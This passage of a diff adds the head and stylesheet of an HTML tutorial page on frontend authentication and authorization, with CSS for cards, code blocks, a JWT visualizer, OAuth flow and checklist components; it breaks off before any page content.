@@ -1,0 +1,2382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Auth & AuthZ — Frontend Security Deep Dive</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap');
+
+  :root {
+    --bg: #080810;
+    --bg2: #0d0d1a;
+    --bg3: #111126;
+    --surface: #14142a;
+    --surface2: #1a1a35;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #e8e8f0;
+    --text2: #9090b0;
+    --text3: #5a5a7a;
+    --blue: #4f8ef7;
+    --blue2: #7aabff;
+    --cyan: #38d9d9;
+    --purple: #a78bfa;
+    --purple2: #c4b5fd;
+    --green: #34d399;
+    --red: #f87171;
+    --orange: #fb923c;
+    --yellow: #fbbf24;
+    --grad1: linear-gradient(135deg, #4f8ef7, #a78bfa);
+    --grad2: linear-gradient(135deg, #38d9d9, #4f8ef7);
+    --grad3: linear-gradient(135deg, #a78bfa, #f472b6);
+    --mono: 'JetBrains Mono', monospace;
+    --display: 'Syne', sans-serif;
+    --body: 'DM Sans', sans-serif;
+    --radius: 12px;
+    --radius2: 8px;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 15px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ── Noise texture overlay ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── Top glow ── */
+  body::after {
+    content: '';
+    position: fixed; top: -200px; left: 50%; transform: translateX(-50%);
+    width: 800px; height: 400px;
+    background: radial-gradient(ellipse, rgba(79,142,247,0.12) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ── Sidebar nav ── */
+  .sidebar {
+    position: fixed; top: 0; left: 0; bottom: 0;
+    width: 240px;
+    background: rgba(13,13,26,0.85);
+    backdrop-filter: blur(20px);
+    border-right: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    z-index: 100;
+    overflow-y: auto;
+    padding-bottom: 24px;
+  }
+
+  .sidebar-logo {
+    padding: 24px 20px 20px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 12px;
+  }
+
+  .sidebar-logo .logo-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 8px;
+    padding: 6px 10px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--blue2);
+    letter-spacing: 0.05em;
+  }
+
+  .sidebar-logo .logo-badge::before {
+    content: '🔐';
+    font-size: 14px;
+  }
+
+  .sidebar-title {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    padding: 8px 20px 6px;
+    margin-top: 8px;
+  }
+
+  .nav-item {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 20px;
+    color: var(--text2);
+    font-size: 13.5px;
+    font-weight: 400;
+    cursor: pointer;
+    border-left: 2px solid transparent;
+    transition: all 0.2s;
+    text-decoration: none;
+    border-radius: 0 6px 6px 0;
+  }
+
+  .nav-item:hover { color: var(--text); background: var(--surface); }
+  .nav-item.active { color: var(--blue2); border-left-color: var(--blue); background: rgba(79,142,247,0.08); }
+
+  .nav-item .nav-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: currentColor;
+    opacity: 0.5;
+    flex-shrink: 0;
+  }
+
+  /* ── Main content ── */
+  .main {
+    margin-left: 240px;
+    min-height: 100vh;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── Hero ── */
+  .hero {
+    padding: 80px 60px 60px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute; top: 0; right: 0;
+    width: 500px; height: 400px;
+    background: radial-gradient(ellipse at top right, rgba(167,139,250,0.1), transparent 60%);
+    pointer-events: none;
+  }
+
+  .hero-tag {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(79,142,247,0.1);
+    border: 1px solid rgba(79,142,247,0.3);
+    border-radius: 100px;
+    padding: 4px 12px;
+    font-size: 12px;
+    color: var(--blue2);
+    font-family: var(--mono);
+    margin-bottom: 24px;
+    letter-spacing: 0.05em;
+  }
+
+  .hero-tag::before { content: '▶'; font-size: 8px; }
+
+  .hero h1 {
+    font-family: var(--display);
+    font-size: clamp(32px, 4vw, 52px);
+    font-weight: 800;
+    line-height: 1.1;
+    margin-bottom: 20px;
+    letter-spacing: -0.02em;
+  }
+
+  .hero h1 .grad {
+    background: var(--grad1);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-sub {
+    font-size: 17px;
+    color: var(--text2);
+    max-width: 600px;
+    line-height: 1.7;
+    margin-bottom: 32px;
+    font-weight: 300;
+  }
+
+  .hero-meta {
+    display: flex; gap: 20px; flex-wrap: wrap;
+  }
+
+  .meta-pill {
+    display: flex; align-items: center; gap: 6px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 6px 14px;
+    font-size: 13px;
+    color: var(--text2);
+  }
+
+  .meta-pill .dot { width: 6px; height: 6px; border-radius: 50%; }
+  .dot-blue { background: var(--blue); }
+  .dot-purple { background: var(--purple); }
+  .dot-green { background: var(--green); }
+
+  /* ── Sections ── */
+  .section {
+    padding: 60px 60px;
+    border-bottom: 1px solid var(--border);
+    scroll-margin-top: 20px;
+  }
+
+  .section-label {
+    display: inline-flex; align-items: center; gap: 8px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    margin-bottom: 12px;
+  }
+
+  .section-label::before {
+    content: '';
+    display: inline-block;
+    width: 24px; height: 1px;
+    background: var(--text3);
+  }
+
+  .section-title {
+    font-family: var(--display);
+    font-size: clamp(22px, 2.5vw, 32px);
+    font-weight: 700;
+    line-height: 1.2;
+    margin-bottom: 16px;
+    letter-spacing: -0.02em;
+  }
+
+  .section-intro {
+    color: var(--text2);
+    max-width: 680px;
+    margin-bottom: 40px;
+    font-size: 15.5px;
+    font-weight: 300;
+  }
+
+  /* ── Why it matters callout ── */
+  .danger-box {
+    background: rgba(248,113,113,0.06);
+    border: 1px solid rgba(248,113,113,0.2);
+    border-left: 3px solid var(--red);
+    border-radius: var(--radius);
+    padding: 20px 24px;
+    margin-bottom: 20px;
+  }
+
+  .danger-box h4 {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--red);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 12px;
+  }
+
+  .danger-item {
+    display: flex; gap: 12px;
+    padding: 8px 0;
+    border-bottom: 1px solid rgba(248,113,113,0.08);
+    color: var(--text2);
+    font-size: 14px;
+  }
+  .danger-item:last-child { border-bottom: none; }
+  .danger-item .di-label {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--red);
+    white-space: nowrap;
+    flex-shrink: 0;
+    padding-top: 2px;
+  }
+
+  /* ── Concept cards ── */
+  .cards-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 16px;
+    margin-bottom: 32px;
+  }
+
+  .concept-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 24px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s, transform 0.2s;
+    cursor: default;
+  }
+
+  .concept-card:hover {
+    border-color: var(--border2);
+    transform: translateY(-2px);
+  }
+
+  .concept-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 2px;
+  }
+
+  .card-blue::before { background: var(--grad2); }
+  .card-purple::before { background: var(--grad1); }
+  .card-green::before { background: linear-gradient(90deg, #34d399, #059669); }
+  .card-orange::before { background: linear-gradient(90deg, #fb923c, #f59e0b); }
+
+  .card-icon {
+    font-size: 24px;
+    margin-bottom: 12px;
+    display: block;
+  }
+
+  .card-title {
+    font-family: var(--display);
+    font-size: 16px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+
+  .card-body {
+    font-size: 13.5px;
+    color: var(--text2);
+    line-height: 1.6;
+  }
+
+  .card-analogy {
+    margin-top: 12px;
+    padding: 10px 12px;
+    background: rgba(255,255,255,0.03);
+    border-radius: var(--radius2);
+    font-size: 12.5px;
+    color: var(--text3);
+    font-style: italic;
+    border-left: 2px solid var(--border2);
+  }
+
+  /* ── Comparison table ── */
+  .compare-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 24px 0;
+    font-size: 14px;
+  }
+
+  .compare-table th {
+    background: var(--surface2);
+    padding: 12px 16px;
+    text-align: left;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .compare-table th:first-child { border-radius: 8px 0 0 0; }
+  .compare-table th:last-child { border-radius: 0 8px 0 0; }
+
+  .compare-table td {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+    vertical-align: top;
+  }
+
+  .compare-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+  .compare-table td:first-child {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text);
+    white-space: nowrap;
+  }
+
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 600;
+  }
+
+  .badge-red { background: rgba(248,113,113,0.15); color: var(--red); }
+  .badge-yellow { background: rgba(251,191,36,0.15); color: var(--yellow); }
+  .badge-green { background: rgba(52,211,153,0.15); color: var(--green); }
+  .badge-blue { background: rgba(79,142,247,0.15); color: var(--blue2); }
+  .badge-orange { background: rgba(251,146,60,0.15); color: var(--orange); }
+
+  /* ── HTTP Status interactive ── */
+  .status-row {
+    display: flex; gap: 16px; margin: 24px 0; flex-wrap: wrap;
+  }
+
+  .status-card {
+    flex: 1; min-width: 200px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    cursor: pointer;
+    transition: all 0.25s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .status-card:hover { transform: translateY(-3px); }
+
+  .status-card.s401 { border-top: 3px solid var(--orange); }
+  .status-card.s403 { border-top: 3px solid var(--red); }
+
+  .status-card .status-code {
+    font-family: var(--display);
+    font-size: 40px;
+    font-weight: 800;
+    line-height: 1;
+    margin-bottom: 8px;
+  }
+
+  .s401 .status-code { color: var(--orange); }
+  .s403 .status-code { color: var(--red); }
+
+  .status-name {
+    font-family: var(--mono);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--text3);
+    margin-bottom: 12px;
+  }
+
+  .status-desc { font-size: 13.5px; color: var(--text2); line-height: 1.6; }
+
+  .status-detail {
+    display: none;
+    margin-top: 16px;
+    padding: 12px;
+    background: rgba(255,255,255,0.03);
+    border-radius: var(--radius2);
+    font-size: 13px;
+    color: var(--text2);
+    border: 1px solid var(--border);
+  }
+
+  .status-card.expanded .status-detail { display: block; }
+
+  /* ── Flow diagram ── */
+  .flow-diagram {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 32px;
+    margin: 24px 0;
+    overflow-x: auto;
+  }
+
+  .flow-steps {
+    display: flex; align-items: center; gap: 0; flex-wrap: nowrap;
+    min-width: fit-content;
+  }
+
+  .flow-step {
+    display: flex; flex-direction: column; align-items: center;
+    gap: 8px;
+    min-width: 120px;
+  }
+
+  .flow-box {
+    padding: 10px 14px;
+    border-radius: 8px;
+    font-size: 12px;
+    font-family: var(--mono);
+    text-align: center;
+    border: 1px solid;
+    line-height: 1.4;
+    white-space: nowrap;
+  }
+
+  .fbox-blue { background: rgba(79,142,247,0.1); border-color: rgba(79,142,247,0.3); color: var(--blue2); }
+  .fbox-purple { background: rgba(167,139,250,0.1); border-color: rgba(167,139,250,0.3); color: var(--purple2); }
+  .fbox-cyan { background: rgba(56,217,217,0.1); border-color: rgba(56,217,217,0.3); color: var(--cyan); }
+  .fbox-green { background: rgba(52,211,153,0.1); border-color: rgba(52,211,153,0.3); color: var(--green); }
+  .fbox-orange { background: rgba(251,146,60,0.1); border-color: rgba(251,146,60,0.3); color: var(--orange); }
+
+  .flow-label {
+    font-size: 11px; color: var(--text3); font-family: var(--mono); text-align: center;
+  }
+
+  .flow-arrow {
+    color: var(--text3);
+    font-size: 18px;
+    margin: 0 2px;
+    flex-shrink: 0;
+    padding-bottom: 20px;
+  }
+
+  /* ── Code blocks ── */
+  .code-block {
+    background: #0c0c1e;
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin: 20px 0;
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+
+  .code-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 16px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-header .dots { display: flex; gap: 6px; }
+  .code-header .dots span {
+    width: 10px; height: 10px; border-radius: 50%;
+  }
+  .code-header .dots span:nth-child(1) { background: #ff5f57; }
+  .code-header .dots span:nth-child(2) { background: #febc2e; }
+  .code-header .dots span:nth-child(3) { background: #28c840; }
+
+  .code-header .code-lang {
+    font-size: 11px; color: var(--text3);
+    text-transform: uppercase; letter-spacing: 0.08em;
+  }
+
+  .code-copy {
+    background: none; border: 1px solid var(--border); color: var(--text3);
+    padding: 3px 10px; border-radius: 4px; font-size: 11px;
+    cursor: pointer; font-family: var(--mono);
+    transition: all 0.2s;
+  }
+  .code-copy:hover { color: var(--text); border-color: var(--border2); }
+
+  .code-body {
+    padding: 20px;
+    overflow-x: auto;
+    line-height: 1.7;
+    color: var(--text2);
+  }
+
+  .code-body .kw { color: #c4b5fd; }
+  .code-body .fn { color: #7aabff; }
+  .code-body .str { color: #6ee7b7; }
+  .code-body .cmt { color: #3a3a5a; }
+  .code-body .num { color: #fb923c; }
+  .code-body .tag { color: #f472b6; }
+  .code-body .attr { color: #7aabff; }
+  .code-body .const { color: #fbbf24; }
+
+  /* ── Accordion ── */
+  .accordion { margin: 20px 0; }
+
+  .acc-item {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    margin-bottom: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .acc-item.open { border-color: var(--border2); }
+
+  .acc-trigger {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.2s;
+  }
+
+  .acc-trigger:hover { background: rgba(255,255,255,0.02); }
+
+  .acc-trigger-left {
+    display: flex; align-items: center; gap: 12px;
+  }
+
+  .acc-icon { font-size: 18px; flex-shrink: 0; }
+
+  .acc-title {
+    font-family: var(--display);
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+  }
+
+  .acc-arrow {
+    color: var(--text3);
+    font-size: 12px;
+    transition: transform 0.25s;
+  }
+
+  .acc-item.open .acc-arrow { transform: rotate(180deg); color: var(--blue2); }
+
+  .acc-body {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.35s ease;
+  }
+
+  .acc-body-inner {
+    padding: 0 20px 20px;
+    color: var(--text2);
+    font-size: 14px;
+    line-height: 1.7;
+    border-top: 1px solid var(--border);
+    padding-top: 16px;
+  }
+
+  /* ── Tabs ── */
+  .tabs-wrapper { margin: 24px 0; }
+
+  .tab-nav {
+    display: flex; gap: 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 0;
+    overflow-x: auto;
+  }
+
+  .tab-btn {
+    padding: 10px 18px;
+    background: none; border: none;
+    color: var(--text3);
+    font-size: 13.5px;
+    font-family: var(--body);
+    cursor: pointer;
+    white-space: nowrap;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+    margin-bottom: -1px;
+  }
+
+  .tab-btn:hover { color: var(--text2); }
+  .tab-btn.active { color: var(--blue2); border-bottom-color: var(--blue); }
+
+  .tab-panel { display: none; padding: 24px 0; }
+  .tab-panel.active { display: block; }
+
+  /* ── Storage comparison visual ── */
+  .storage-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 12px;
+    margin: 20px 0;
+  }
+
+  .storage-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    transition: all 0.2s;
+    position: relative;
+  }
+
+  .storage-card:hover { border-color: var(--border2); }
+
+  .storage-card .sc-title {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text);
+    margin-bottom: 12px;
+    display: flex; align-items: center; gap: 8px;
+  }
+
+  .sc-risk {
+    display: inline-block;
+    width: 8px; height: 8px; border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .risk-high { background: var(--red); box-shadow: 0 0 6px var(--red); }
+  .risk-med { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+  .risk-low { background: var(--green); box-shadow: 0 0 6px var(--green); }
+
+  .sc-rows { display: flex; flex-direction: column; gap: 6px; }
+
+  .sc-row {
+    display: flex; justify-content: space-between; align-items: center;
+    font-size: 12px;
+  }
+
+  .sc-row .sc-key { color: var(--text3); }
+  .sc-row .sc-val { color: var(--text2); font-family: var(--mono); font-size: 11px; }
+
+  /* ── JWT visualizer ── */
+  .jwt-visualizer {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 24px;
+    margin: 20px 0;
+  }
+
+  .jwt-string {
+    font-family: var(--mono);
+    font-size: 13px;
+    word-break: break-all;
+    line-height: 1.6;
+    margin-bottom: 20px;
+    padding: 16px;
+    background: var(--bg);
+    border-radius: var(--radius2);
+    border: 1px solid var(--border);
+  }
+
+  .jwt-h { color: #fb923c; }
+  .jwt-p { color: #7aabff; }
+  .jwt-s { color: #c4b5fd; }
+  .jwt-dot { color: var(--text3); }
+
+  .jwt-parts {
+    display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px;
+  }
+
+  .jwt-part {
+    border-radius: var(--radius2);
+    padding: 14px;
+    border: 1px solid;
+  }
+
+  .jwt-part-header { background: rgba(251,146,60,0.08); border-color: rgba(251,146,60,0.25); }
+  .jwt-part-payload { background: rgba(122,171,255,0.08); border-color: rgba(122,171,255,0.25); }
+  .jwt-part-sig { background: rgba(196,181,253,0.08); border-color: rgba(196,181,253,0.25); }
+
+  .jwt-part-title {
+    font-family: var(--mono); font-size: 11px;
+    text-transform: uppercase; letter-spacing: 0.08em;
+    margin-bottom: 8px;
+  }
+
+  .jwt-part-header .jwt-part-title { color: var(--orange); }
+  .jwt-part-payload .jwt-part-title { color: var(--blue2); }
+  .jwt-part-sig .jwt-part-title { color: var(--purple2); }
+
+  .jwt-part-body { font-size: 12px; color: var(--text2); line-height: 1.6; }
+
+  /* ── OAuth flow ── */
+  .oauth-flow {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 28px;
+    margin: 20px 0;
+  }
+
+  .oauth-steps {
+    display: flex; flex-direction: column; gap: 0;
+  }
+
+  .oauth-step {
+    display: flex; gap: 16px;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    cursor: default;
+    transition: background 0.2s;
+  }
+
+  .oauth-step:last-child { border-bottom: none; }
+  .oauth-step:hover { background: rgba(255,255,255,0.01); border-radius: 8px; padding-left: 8px; }
+
+  .step-num {
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--mono); font-size: 11px; font-weight: 600;
+    color: var(--blue2);
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .step-content { flex: 1; }
+  .step-title { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
+  .step-desc { font-size: 13px; color: var(--text2); }
+
+  .step-code {
+    display: inline-block; margin-top: 6px;
+    font-family: var(--mono); font-size: 11px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 3px 8px; border-radius: 4px;
+    color: var(--cyan);
+  }
+
+  /* ── XSS risk diagram ── */
+  .risk-diagram {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 24px;
+    margin: 20px 0;
+  }
+
+  .risk-row {
+    display: flex; align-items: stretch; gap: 12px;
+    margin-bottom: 12px;
+  }
+
+  .risk-label {
+    width: 140px; flex-shrink: 0;
+    font-family: var(--mono); font-size: 12px;
+    color: var(--text2);
+    display: flex; align-items: center;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius2);
+    padding: 8px 12px;
+  }
+
+  .risk-bar-wrap {
+    flex: 1;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius2);
+    overflow: hidden;
+    position: relative;
+  }
+
+  .risk-bar {
+    height: 100%; min-height: 36px;
+    display: flex; align-items: center; padding: 8px 12px;
+    font-size: 12px; font-family: var(--mono);
+    border-radius: var(--radius2);
+    white-space: nowrap;
+  }
+
+  .risk-high-bar { background: rgba(248,113,113,0.2); color: var(--red); width: 90%; }
+  .risk-med-bar { background: rgba(251,191,36,0.2); color: var(--yellow); width: 65%; }
+  .risk-low-bar { background: rgba(52,211,153,0.2); color: var(--green); width: 25%; }
+
+  /* ── Checklist ── */
+  .checklist {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
+    margin: 20px 0;
+  }
+
+  .check-col {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+  }
+
+  .check-col.do-col { border-top: 3px solid var(--green); }
+  .check-col.dont-col { border-top: 3px solid var(--red); }
+
+  .check-col-title {
+    font-family: var(--mono); font-size: 12px;
+    text-transform: uppercase; letter-spacing: 0.1em;
+    margin-bottom: 14px;
+  }
+
+  .do-col .check-col-title { color: var(--green); }
+  .dont-col .check-col-title { color: var(--red); }
+
+  .check-item {
+    display: flex; gap: 10px; align-items: flex-start;
+    padding: 7px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 13.5px; color: var(--text2);
+  }
+
+  .check-item:last-child { border-bottom: none; }
+
+  .check-item .ci-icon { flex-shrink: 0; margin-top: 1px; font-size: 13px; }
+
+  /* ── Toggle: beginner/advanced ── */
+  .mode-toggle {
+    display: flex; align-items: center; gap: 12px;
+    margin-bottom: 24px;
+  }
+
+  .mode-toggle-label {
+    font-size: 13px; color: var(--text3);
+    font-family: var(--mono);
+  }
+
+  .toggle-switch {
+    position: relative;
+    width: 48px; height: 26px;
+    cursor: pointer;
+  }
+
+  .toggle-switch input { display: none; }
+
+  .toggle-track {
+    position: absolute; inset: 0;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 13px;
+    transition: background 0.2s;
+  }
+
+  .toggle-switch input:checked ~ .toggle-track {
+    background: rgba(79,142,247,0.3);
+    border-color: rgba(79,142,247,0.5);
+  }
+
+  .toggle-thumb {
+    position: absolute;
+    top: 3px; left: 3px;
+    width: 18px; height: 18px;
+    background: var(--text3);
+    border-radius: 50%;
+    transition: transform 0.2s, background 0.2s;
+  }
+
+  .toggle-switch input:checked ~ .toggle-track .toggle-thumb {
+    transform: translateX(22px);
+    background: var(--blue2);
+  }
+
+  .advanced-only { display: none; }
+  .advanced-mode .advanced-only { display: block; }
+  .advanced-mode .beginner-only { display: none; }
+
+  /* ── Tooltip ── */
+  .tooltip-wrap {
+    position: relative; display: inline-block;
+    border-bottom: 1px dashed var(--text3);
+    cursor: help;
+  }
+
+  .tooltip-box {
+    position: absolute; bottom: 100%; left: 50%; transform: translateX(-50%);
+    background: var(--surface2);
+    border: 1px solid var(--border2);
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-size: 12.5px;
+    color: var(--text2);
+    width: 220px;
+    z-index: 200;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.2s;
+    margin-bottom: 8px;
+    line-height: 1.5;
+  }
+
+  .tooltip-wrap:hover .tooltip-box { opacity: 1; }
+
+  /* ── Callout box ── */
+  .callout {
+    border-radius: var(--radius);
+    padding: 16px 20px;
+    margin: 16px 0;
+    display: flex; gap: 12px; align-items: flex-start;
+    font-size: 14px; line-height: 1.6;
+  }
+
+  .callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .callout-body { color: var(--text2); }
+  .callout-body strong { color: var(--text); }
+
+  .callout-info { background: rgba(79,142,247,0.06); border: 1px solid rgba(79,142,247,0.2); }
+  .callout-warn { background: rgba(251,191,36,0.06); border: 1px solid rgba(251,191,36,0.2); }
+  .callout-success { background: rgba(52,211,153,0.06); border: 1px solid rgba(52,211,153,0.2); }
+  .callout-danger { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.2); }
+
+  /* ── React flow diagram ── */
+  .react-arch {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 28px;
+    margin: 20px 0;
+    overflow-x: auto;
+  }
+
+  .arch-row {
+    display: flex; align-items: center; gap: 12px;
+    margin-bottom: 12px;
+    flex-wrap: wrap;
+  }
+
+  .arch-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-family: var(--mono); font-size: 12px;
+    color: var(--text2);
+    white-space: nowrap;
+  }
+
+  .arch-box.ab-provider { border-color: rgba(79,142,247,0.4); color: var(--blue2); background: rgba(79,142,247,0.08); }
+  .arch-box.ab-router { border-color: rgba(167,139,250,0.4); color: var(--purple2); background: rgba(167,139,250,0.08); }
+  .arch-box.ab-protected { border-color: rgba(52,211,153,0.4); color: var(--green); background: rgba(52,211,153,0.08); }
+  .arch-box.ab-public { border-color: rgba(251,191,36,0.4); color: var(--yellow); background: rgba(251,191,36,0.08); }
+  .arch-box.ab-api { border-color: rgba(56,217,217,0.4); color: var(--cyan); background: rgba(56,217,217,0.08); }
+
+  .arch-arrow { color: var(--text3); font-size: 14px; }
+
+  /* ── Progress bar ── */
+  .progress-bar {
+    position: fixed; top: 0; left: 240px; right: 0; height: 2px;
+    background: var(--border);
+    z-index: 200;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: var(--grad1);
+    width: 0%;
+    transition: width 0.1s;
+  }
+
+  /* ── Scrollbar ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--surface2); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--border2); }
+
+  /* ── Responsive ── */
+  @media (max-width: 900px) {
+    .sidebar { display: none; }
+    .main { margin-left: 0; }
+    .progress-bar { left: 0; }
+    .hero, .section { padding: 40px 24px; }
+    .jwt-parts { grid-template-columns: 1fr; }
+    .checklist { grid-template-columns: 1fr; }
+    .status-row { flex-direction: column; }
+  }
+
+  /* ── Animation ── */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .fade-up { animation: fadeUp 0.5s ease both; }
+  .fade-up-1 { animation-delay: 0.1s; }
+  .fade-up-2 { animation-delay: 0.2s; }
+  .fade-up-3 { animation-delay: 0.3s; }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  .live-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--green);
+    animation: pulse 2s ease infinite;
+    display: inline-block;
+  }
+
+  /* ── JWT interactive demo ── */
+  #jwt-demo-input {
+    width: 100%; background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius2);
+    padding: 12px 14px;
+    color: var(--text);
+    font-family: var(--mono); font-size: 12px;
+    resize: vertical; min-height: 80px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  #jwt-demo-input:focus { border-color: var(--blue); }
+
+  #jwt-demo-output {
+    margin-top: 12px;
+    padding: 16px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius2);
+    font-family: var(--mono); font-size: 12px;
+    color: var(--text2);
+    min-height: 80px;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .demo-btn {
+    margin-top: 10px;
+    padding: 8px 18px;
+    background: var(--surface2);
+    border: 1px solid var(--border2);
+    border-radius: 8px;
+    color: var(--blue2);
+    font-family: var(--mono); font-size: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .demo-btn:hover { background: rgba(79,142,247,0.15); border-color: rgba(79,142,247,0.4); }
+
+  /* Inline code */
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 4px;
+    color: var(--cyan);
+  }
+
+  p { margin-bottom: 12px; }
